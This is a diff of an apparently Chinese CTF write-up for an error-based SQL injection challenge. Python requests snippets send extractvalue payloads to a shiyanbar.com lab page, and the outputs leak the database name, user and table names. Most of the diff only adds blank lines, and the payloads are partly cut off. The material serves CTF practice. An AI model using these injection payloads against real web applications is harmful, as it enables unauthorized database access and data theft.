@@ -10,6 +10,7 @@
 ===
 ### 获取数据库名称
 code
+
 ```python
 import requests
 
@@ -19,12 +20,18 @@ r = requests.post("http://ctf5.shiyanbar.com/web/baocuo/index.php",data=data)
 r.encoding='utf-8'
 print(r.text)
 ```
+
+
 output
+
 ```shell
 <br>XPATH syntax error: '\error_based_hpf'
 ```
+
+
 ### 获取用户名称
 code
+
 ```python
 import requests
 
@@ -34,14 +41,19 @@ r = requests.post("http://ctf5.shiyanbar.com/web/baocuo/index.php",data=data)
 r.encoding='utf-8'
 print(r.text)
 ```
+
+
 output
+
 ```shell
 <br>XPATH syntax error: '\web8@localhost'
 
 ```
 
+
 ### 获取所有数据表名称
 code
+
 ```python
 import requests
 data={'username':"'or extractvalue/*",
@@ -50,12 +62,16 @@ r = requests.post("http://ctf5.shiyanbar.com/web/baocuo/index.php",data=data)
 r.encoding='utf-8'
 print(r.text)
 ```
+
+
 output
+
 ```shell
 <br>XPATH syntax error: '\ffll44jj,users'
 ```
 
-### 获取所有字段 
+
+
 
 ```{.python .input}
 
